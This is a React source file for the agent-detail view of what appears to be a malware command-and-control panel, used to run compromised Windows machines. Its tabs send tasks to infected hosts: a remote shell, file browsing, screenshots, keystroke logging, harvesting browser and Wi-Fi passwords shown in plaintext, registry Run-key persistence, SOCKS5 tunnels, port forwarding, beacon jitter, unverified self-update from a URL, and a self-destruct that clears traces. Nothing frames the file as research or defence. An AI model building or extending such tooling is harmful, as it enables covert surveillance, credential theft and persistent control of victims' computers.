import React, { useState, useEffect } from 'react';
import { api } from '../api';
import Modal from '../components/Modal';
import Terminal from '../components/Terminal';

function countryFlag(code) {
  if (!code || code.length !== 2) return '';
  return String.fromCodePoint(
    ...code.toUpperCase().split('').map(c => 0x1F1E6 + c.charCodeAt(0) - 65)
  );
}

const TABS = ['Terminal','Storage','Tasks','Display','Input Log','Vault','Config Store','Services','Network','Settings'];

export default function AgentModal({ agent, onClose }) {
  const [tab, setTab] = useState(0);
  const [tasks, setTasks] = useState([]);
  const [results, setResults] = useState([]);
  const [creds, setCreds] = useState([]);
  const [sleep, setSleep] = useState(agent.sleep_seconds || 5);
  const [jitter, setJitter] = useState(agent.jitter_percent || 20);

  useEffect(() => {
    api.getAgentTasks(agent.id).then(setTasks).catch(() => {});
    api.getAgentResults(agent.id).then(setResults).catch(() => {});
    api.getCredentials('agent_id=' + agent.id).then(setCreds).catch(() => {});
  }, [agent.id]);

  const sendCommand = async (cmd) => {
    const res = await api.createTask(agent.id, 'terminal_session', { command: cmd });
    setTasks(prev => [{ id: res.id, task_type: 'terminal_session', args_json: JSON.stringify({ command: cmd }), status: 'pending', created_at: new Date().toISOString() }, ...prev]);
    return 'Task #' + res.id + ' queued';
  };

  const statusColor = agent.status === 'dead' ? 'red' : agent.status === 'dormant' ? 'yellow' : 'green';

  const timeSince = (d) => {
    if (!d) return '-';
    const s = Math.floor((Date.now() - new Date(d).getTime()) / 1000);
    if (s < 60) return s + 's ago';
    if (s < 3600) return Math.floor(s / 60) + 'm ago';
    return Math.floor(s / 3600) + 'h ago';
  };

  return (
    <Modal onClose={onClose}>
      {/* HEADER */}
      <div className="modal-header">
        <div className="modal-header-left">
          <span className={`status-dot ${statusColor}`} />
          <span>{agent.id?.substring(0, 10).toUpperCase()}</span>
          <span style={{ color: 'var(--text-sec)' }}>{agent.hostname}</span>
          <span className="badge-admin" style={{ borderColor: `var(--${statusColor})`, color: `var(--${statusColor})` }}>
            {agent.status?.toUpperCase()}
          </span>
        </div>
        <div className="modal-header-center">
          <span>{agent.os} • {agent.arch}</span>
        </div>
        <div className="modal-header-right">
          <span>{countryFlag(agent.country)} {agent.country}{agent.city ? ' • ' + agent.city : ''}{agent.isp ? ' • ' + agent.isp : ''}</span>
          <span>{agent.ip_external || agent.ip_internal}</span>
          <span style={{ color: `var(--${statusColor})` }}>Last seen: {timeSince(agent.last_seen)}</span>
          <button className="modal-close" onClick={onClose}>✕</button>
        </div>
      </div>

      {/* TABS */}
      <div className="modal-tabs">
        {TABS.map((t, i) => (
          <button key={i} className={`modal-tab ${tab === i ? 'active' : ''}`} onClick={() => setTab(i)}>{t}</button>
        ))}
      </div>

      {/* BODY */}
      <div className="modal-body">
        {/* TAB 0: TERMINAL */}
        {tab === 0 && <Terminal agentId={agent.id} onSendCommand={sendCommand} />}

        {/* TAB 1: STORAGE */}
        {tab === 1 && <StorageTab agentId={agent.id} />}

        {/* TAB 2: TASKS */}
        {tab === 2 && <TasksTab tasks={tasks} />}

        {/* TAB 3: DISPLAY */}
        {tab === 3 && <DisplayTab agentId={agent.id} />}

        {/* TAB 4: INPUT LOG */}
        {tab === 4 && <InputLogTab agentId={agent.id} />}

        {/* TAB 5: VAULT */}
        {tab === 5 && <VaultTab creds={creds} agentId={agent.id} />}

        {/* TAB 6: CONFIG STORE */}
        {tab === 6 && <ConfigStoreTab agentId={agent.id} />}

        {/* TAB 7: SERVICES */}
        {tab === 7 && <ServicesTab agentId={agent.id} />}

        {/* TAB 8: NETWORK */}
        {tab === 8 && <NetworkTab agentId={agent.id} />}

        {/* TAB 9: SETTINGS */}
        {tab === 9 && <AgentSettingsTab agentId={agent.id} sleep={sleep} setSleep={setSleep} jitter={jitter} setJitter={setJitter} />}
      </div>
    </Modal>
  );
}

/* ========== STORAGE TAB ========== */
function StorageTab({ agentId }) {
  const [path, setPath] = useState(['C:', 'Users']);
  const [files, setFiles] = useState([]);

  const loadFiles = () => {
    api.createTask(agentId, 'storage_list', { path: path.join('\\') });
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="breadcrumb">
        {path.map((p, i) => (
          <span key={i}>
            <span onClick={() => setPath(path.slice(0, i + 1))}>{p}</span>
            {i < path.length - 1 && <span className="sep">&gt;</span>}
          </span>
        ))}
      </div>
      <div className="toolbar">
        <button className="btn btn-sm btn-green" onClick={loadFiles}>UPLOAD</button>
        <button className="btn btn-sm btn-green">DOWNLOAD</button>
        <button className="btn btn-sm btn-red">DELETE</button>
        <button className="btn btn-sm">NEW FOLDER</button>
        <button className="btn btn-sm" onClick={loadFiles}>REFRESH</button>
      </div>
      <table>
        <thead><tr><th>Name</th><th>Size</th><th>Type</th><th>Modified</th><th>Actions</th></tr></thead>
        <tbody>
          <tr>
            <td style={{ color: 'var(--yellow)' }}>📁 Documents</td>
            <td>-</td><td>Folder</td><td>-</td>
            <td><button className="btn btn-sm" onClick={() => setPath([...path, 'Documents'])}>OPEN</button></td>
          </tr>
          <tr>
            <td style={{ color: 'var(--yellow)' }}>📁 Desktop</td>
            <td>-</td><td>Folder</td><td>-</td>
            <td><button className="btn btn-sm" onClick={() => setPath([...path, 'Desktop'])}>OPEN</button></td>
          </tr>
          {files.length === 0 && (
            <tr><td colSpan={5} style={{ color: 'var(--text-disabled)', textAlign: 'center' }}>
              Click REFRESH to browse the agent filesystem
            </td></tr>
          )}
        </tbody>
      </table>
    </div>
  );
}

/* ========== TASKS TAB ========== */
function TasksTab({ tasks }) {
  const [filter, setFilter] = useState('all');
  const filtered = filter === 'all' ? tasks : tasks.filter(t => t.status === filter);

  return (
    <div style={{ padding: 16 }}>
      <div className="filter-bar">
        {['all','pending','sent','completed','failed'].map(f => (
          <button key={f} className={`btn ${filter === f ? 'active' : ''}`} onClick={() => setFilter(f)}>{f.toUpperCase()}</button>
        ))}
      </div>
      <table>
        <thead><tr><th>ID</th><th>Type</th><th>Args</th><th>Status</th><th>Created</th><th>Completed</th></tr></thead>
        <tbody>
          {filtered.length === 0 ? (
            <tr><td colSpan={6} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No tasks</td></tr>
          ) : filtered.map(t => (
            <tr key={t.id}>
              <td>TSK-{String(t.id).padStart(3,'0')}</td>
              <td>{t.task_type}</td>
              <td style={{ maxWidth: 200, overflow: 'hidden', textOverflow: 'ellipsis' }}>{t.args_json}</td>
              <td style={{ color: t.status === 'completed' ? 'var(--green)' : t.status === 'failed' ? 'var(--red)' : t.status === 'pending' ? 'var(--yellow)' : 'var(--blue)' }}>
                {t.status?.toUpperCase()}
              </td>
              <td>{t.created_at ? new Date(t.created_at).toLocaleTimeString() : '-'}</td>
              <td>{t.completed_at ? new Date(t.completed_at).toLocaleTimeString() : '-'}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

/* ========== DISPLAY TAB ========== */
function DisplayTab({ agentId }) {
  const [captures, setCaptures] = useState([]);
  const [autoCapture, setAutoCapture] = useState(false);

  const takeCapture = () => {
    api.createTask(agentId, 'display_capture', {});
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="toolbar">
        <button className="btn btn-green" onClick={takeCapture}>CAPTURE</button>
        <button className={`btn btn-sm ${autoCapture ? 'active' : ''}`} onClick={() => setAutoCapture(!autoCapture)}>
          AUTO-CAPTURE ({autoCapture ? 'ON' : 'OFF'})
        </button>
        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginLeft: 12 }}>INTERVAL: 30S</span>
      </div>
      <div style={{ border: '1px solid var(--border)', background: 'var(--term-bg)', minHeight: 300, display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: 12 }}>
        <div style={{ textAlign: 'center' }}>
          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="var(--text-disabled)" strokeWidth="1"><rect x="2" y="3" width="20" height="14"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-disabled)', marginTop: 12, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
            No captures yet. Click CAPTURE to take a screenshot.
          </div>
        </div>
      </div>
      <div style={{ marginTop: 16 }}>
        <div className="section-label">Capture History</div>
        <div style={{ display: 'flex', gap: 8 }}>
          {captures.length === 0 && [0,1,2].map(i => (
            <div key={i} style={{ width: 120, height: 75, border: '1px solid var(--border)', background: 'var(--term-bg)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'var(--font-mono)', fontSize: 9, color: 'var(--text-disabled)' }}>EMPTY</div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ========== INPUT LOG TAB ========== */
function InputLogTab({ agentId }) {
  const [monitoring, setMonitoring] = useState(false);
  const [logs, setLogs] = useState([]);

  const startMonitor = () => {
    api.createTask(agentId, 'input_monitor', { action: 'start' });
    setMonitoring(true);
  };
  const stopMonitor = () => {
    api.createTask(agentId, 'input_monitor', { action: 'stop' });
    setMonitoring(false);
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="toolbar">
        <button className="btn btn-green" onClick={startMonitor}>START</button>
        <button className="btn btn-red" onClick={stopMonitor}>STOP</button>
        <button className="btn btn-sm" onClick={() => setLogs([])}>CLEAR LOG</button>
        <button className="btn btn-sm">EXPORT</button>
        {monitoring && <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--green)', marginLeft: 12 }}>● RECORDING</span>}
      </div>
      <div className="keystroke-display" style={{ marginTop: 12, minHeight: 300 }}>
        {logs.length === 0 ? (
          <div style={{ color: 'var(--text-disabled)' }}>No keystrokes captured. Click START to begin monitoring.</div>
        ) : logs.map((l, i) => (
          <div key={i}>
            <span className="ks-time">[{l.time}]</span> <span className="ks-app">{l.app}:</span> {l.text}
          </div>
        ))}
      </div>
    </div>
  );
}

/* ========== VAULT TAB ========== */
function VaultTab({ creds, agentId }) {
  const [filter, setFilter] = useState('all');
  const filtered = filter === 'all' ? creds : creds.filter(c => c.source?.toLowerCase() === filter);

  const harvest = () => {
    api.createTask(agentId, 'vault_read', { targets: ['chrome','firefox','edge','wifi','system'] });
  };

  const copyPw = (pw) => {
    navigator.clipboard.writeText(pw).catch(() => {});
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="filter-bar">
        {['all','chrome','firefox','edge','wifi','system'].map(f => (
          <button key={f} className={`btn ${filter === f ? 'active' : ''}`} onClick={() => setFilter(f)}>{f.toUpperCase()}</button>
        ))}
        <button className="btn btn-green" style={{ marginLeft: 'auto' }} onClick={harvest}>HARVEST NOW</button>
      </div>
      <table>
        <thead><tr><th>Source</th><th>URL</th><th>Username</th><th>Password</th><th>Harvested</th><th></th></tr></thead>
        <tbody>
          {filtered.length === 0 ? (
            <tr><td colSpan={6} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No credentials. Click HARVEST NOW.</td></tr>
          ) : filtered.map(c => (
            <tr key={c.id}>
              <td>{c.source}</td>
              <td style={{ color: 'var(--text-sec)' }}>{c.url}</td>
              <td>{c.username}</td>
              <td><span className="pw-plain">{c.password}</span></td>
              <td>{c.created_at ? new Date(c.created_at).toLocaleTimeString() : '-'}</td>
              <td><button className="copy-btn" onClick={() => copyPw(c.password)}>COPY</button></td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

/* ========== CONFIG STORE TAB ========== */
function ConfigStoreTab({ agentId }) {
  const [selectedKey, setSelectedKey] = useState('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run');
  const treeData = [
    { name: 'HKEY_LOCAL_MACHINE', children: [
      { name: 'SOFTWARE', children: [
        { name: 'Microsoft', children: [
          { name: 'Windows', children: [
            { name: 'CurrentVersion', children: [
              { name: 'Run', key: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
              { name: 'RunOnce', key: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' },
              { name: 'Uninstall', key: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall' },
            ]},
          ]},
          { name: 'Policies' },
          { name: '.NETFramework' },
        ]},
      ]},
    ]},
  ];

  const refreshReg = () => {
    api.createTask(agentId, 'config_read', { key: selectedKey });
  };

  const renderTree = (nodes, depth = 0) => nodes.map((n, i) => (
    <div key={i}>
      <div className="reg-node" style={{ paddingLeft: depth * 20 }} onClick={() => n.key && setSelectedKey(n.key)}>
        <span className="reg-icon">{n.children ? '▼' : '▶'}</span> {n.name}
      </div>
      {n.children && renderTree(n.children, depth + 1)}
    </div>
  ));

  return (
    <div style={{ padding: 16 }}>
      <div className="section-label">Registry Browser</div>
      <div style={{ display: 'grid', gridTemplateColumns: '280px 1fr', gap: 16 }}>
        <div style={{ border: '1px solid var(--border)', background: 'var(--term-bg)', padding: 12, fontFamily: 'var(--font-mono)', fontSize: 11, minHeight: 300, overflowY: 'auto' }}>
          {renderTree(treeData)}
        </div>
        <div>
          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginBottom: 8, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
            {selectedKey}
          </div>
          <button className="btn btn-sm" onClick={refreshReg} style={{ marginBottom: 12 }}>REFRESH</button>
          <table>
            <thead><tr><th>Name</th><th>Type</th><th>Data</th></tr></thead>
            <tbody>
              <tr><td colSpan={3} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>Click REFRESH to load registry values</td></tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

/* ========== SERVICES TAB ========== */
function ServicesTab({ agentId }) {
  const [services, setServices] = useState([]);

  const addPersistence = () => {
    api.createTask(agentId, 'service_add', {});
  };
  const refresh = () => {
    api.createTask(agentId, 'service_list', {});
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="toolbar">
        <button className="btn btn-green" onClick={addPersistence}>ADD PERSISTENCE</button>
        <button className="btn btn-sm" onClick={refresh}>REFRESH</button>
      </div>
      <table>
        <thead><tr><th>Name</th><th>Path</th><th>Type</th><th>Status</th><th>Actions</th></tr></thead>
        <tbody>
          {services.length === 0 ? (
            <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No persistence entries. Click REFRESH to scan.</td></tr>
          ) : services.map((s, i) => (
            <tr key={i}>
              <td>{s.name}</td>
              <td style={{ color: 'var(--text-sec)' }}>{s.path}</td>
              <td>{s.type}</td>
              <td style={{ color: s.status === 'active' ? 'var(--green)' : 'var(--yellow)' }}>{s.status?.toUpperCase()}</td>
              <td><button className="btn btn-sm btn-red">REMOVE</button></td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

/* ========== NETWORK TAB ========== */
function NetworkTab({ agentId }) {
  const [socksPort, setSocksPort] = useState(1080);
  const [fwdLocal, setFwdLocal] = useState('');
  const [fwdRemote, setFwdRemote] = useState('');
  const [tunnels, setTunnels] = useState([]);
  const [forwards, setForwards] = useState([]);

  const startTunnel = () => {
    api.createTask(agentId, 'network_relay', { type: 'socks5', port: socksPort });
  };
  const addForward = () => {
    api.createTask(agentId, 'network_relay', { type: 'portfwd', local: fwdLocal, remote: fwdRemote });
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="two-col">
        <div>
          <div className="section-label">SOCKS5 Tunnel</div>
          <div className="form-group">
            <label className="form-label">Local Port</label>
            <div style={{ display: 'flex', gap: 8 }}>
              <input type="number" className="form-input" value={socksPort} onChange={e => setSocksPort(e.target.value)} style={{ width: 120 }} />
              <button className="btn btn-green" onClick={startTunnel}>START TUNNEL</button>
            </div>
          </div>
          <div className="section-label" style={{ marginTop: 20 }}>Active Tunnels</div>
          <table>
            <thead><tr><th>Port</th><th>Type</th><th>Status</th><th>Bytes TX</th><th>Actions</th></tr></thead>
            <tbody>
              {tunnels.length === 0 ? (
                <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No active tunnels</td></tr>
              ) : tunnels.map((t, i) => (
                <tr key={i}>
                  <td>{t.port}</td><td>{t.type}</td>
                  <td style={{ color: 'var(--green)' }}>RUNNING</td>
                  <td>{t.bytes}</td>
                  <td><button className="btn btn-sm btn-red">STOP</button></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <div>
          <div className="section-label">Port Forwarding</div>
          <div className="form-row" style={{ marginBottom: 12 }}>
            <div className="form-group">
              <label className="form-label">Local Port</label>
              <input type="number" className="form-input" placeholder="Local port" value={fwdLocal} onChange={e => setFwdLocal(e.target.value)} />
            </div>
            <div className="form-group">
              <label className="form-label">Remote Host:Port</label>
              <input type="text" className="form-input" placeholder="host:port" value={fwdRemote} onChange={e => setFwdRemote(e.target.value)} />
            </div>
          </div>
          <button className="btn btn-green" onClick={addForward}>ADD FORWARD</button>
          <div className="section-label" style={{ marginTop: 20 }}>Active Forwards</div>
          <table>
            <thead><tr><th>Local</th><th>Remote</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody>
              {forwards.length === 0 ? (
                <tr><td colSpan={4} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No active forwards</td></tr>
              ) : forwards.map((f, i) => (
                <tr key={i}>
                  <td>{f.local}</td><td>{f.remote}</td>
                  <td style={{ color: 'var(--green)' }}>ACTIVE</td>
                  <td><button className="btn btn-sm btn-red">REMOVE</button></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

/* ========== AGENT SETTINGS TAB ========== */
function AgentSettingsTab({ agentId, sleep, setSleep, jitter, setJitter }) {
  const [killDate, setKillDate] = useState('2027-01-01');
  const [workStart, setWorkStart] = useState('08:00');
  const [workEnd, setWorkEnd] = useState('18:00');
  const [updateUrl, setUpdateUrl] = useState('');
  const [updateHash, setUpdateHash] = useState('');
  const [showUpdateDialog, setShowUpdateDialog] = useState(false);

  const updateConfig = () => {
    api.createTask(agentId, 'config_update', { sleep, jitter, kill_date: killDate, work_start: workStart, work_end: workEnd });
  };

  const selfDestruct = () => {
    if (confirm('CONFIRM SELF DESTRUCT? This will terminate the agent and remove all persistence.')) {
      api.createTask(agentId, 'self_destruct', {});
    }
  };

  const sendUpdate = () => {
    if (!updateUrl) return;
    api.createTask(agentId, 'self_update', { url: updateUrl, hash: updateHash });
    setShowUpdateDialog(false);
    setUpdateUrl('');
    setUpdateHash('');
  };

  return (
    <div style={{ padding: 16, maxWidth: 600 }}>
      <div className="form-row">
        <div className="form-group">
          <label className="form-label">Sleep Interval (seconds)</label>
          <input type="number" className="form-input" value={sleep} onChange={e => setSleep(parseInt(e.target.value))} />
        </div>
        <div className="form-group">
          <label className="form-label">Jitter (%)</label>
          <div className="slider-container">
            <input type="range" min="0" max="50" value={jitter} onChange={e => setJitter(parseInt(e.target.value))} />
            <span className="slider-val">{jitter}%</span>
          </div>
        </div>
      </div>
      <div className="form-row">
        <div className="form-group">
          <label className="form-label">Kill Date</label>
          <input type="date" className="form-input" value={killDate} onChange={e => setKillDate(e.target.value)} />
        </div>
        <div className="form-group">
          <label className="form-label">Working Hours</label>
          <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
            <input type="time" className="form-input" value={workStart} onChange={e => setWorkStart(e.target.value)} style={{ width: 'auto' }} />
            <span style={{ color: 'var(--text-muted)' }}>to</span>
            <input type="time" className="form-input" value={workEnd} onChange={e => setWorkEnd(e.target.value)} style={{ width: 'auto' }} />
          </div>
        </div>
      </div>
      <div style={{ display: 'flex', gap: 8, marginTop: 24 }}>
        <button className="btn btn-green" onClick={updateConfig}>UPDATE CONFIG</button>
        <button className="btn" onClick={() => api.createTask(agentId, 'reconnect', {})}>RECONNECT</button>
        <button className="btn" style={{ marginLeft: 8 }} onClick={() => setShowUpdateDialog(!showUpdateDialog)}>UPDATE AGENT</button>
      </div>

      {showUpdateDialog && (
        <div style={{ marginTop: 16, padding: 16, border: '1px solid var(--border)', background: 'var(--surface)' }}>
          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-sec)', marginBottom: 12, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
            Self-Update Agent Binary
          </div>
          <div className="form-group">
            <label className="form-label">Binary URL</label>
            <input type="text" className="form-input" value={updateUrl} onChange={e => setUpdateUrl(e.target.value)} placeholder="https://example.com/agent.exe" />
          </div>
          <div className="form-group" style={{ marginTop: 8 }}>
            <label className="form-label">SHA256 Hash (optional)</label>
            <input type="text" className="form-input" value={updateHash} onChange={e => setUpdateHash(e.target.value)} placeholder="Leave empty to skip verification" style={{ fontFamily: 'var(--font-mono)', fontSize: 10 }} />
          </div>
          <div style={{ display: 'flex', gap: 8, marginTop: 12 }}>
            <button className="btn btn-green" onClick={sendUpdate} disabled={!updateUrl}>SEND UPDATE</button>
            <button className="btn" onClick={() => setShowUpdateDialog(false)}>CANCEL</button>
          </div>
        </div>
      )}
      <div style={{ marginTop: 40, paddingTop: 20, borderTop: '1px solid var(--border)' }}>
        <button className="btn btn-red" style={{ fontSize: 11, padding: '12px 24px' }} onClick={selfDestruct}>SELF DESTRUCT</button>
        <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-disabled)', marginTop: 8 }}>
          Removes all persistence, clears traces, terminates agent process.
        </div>
      </div>
    </div>
  );
}
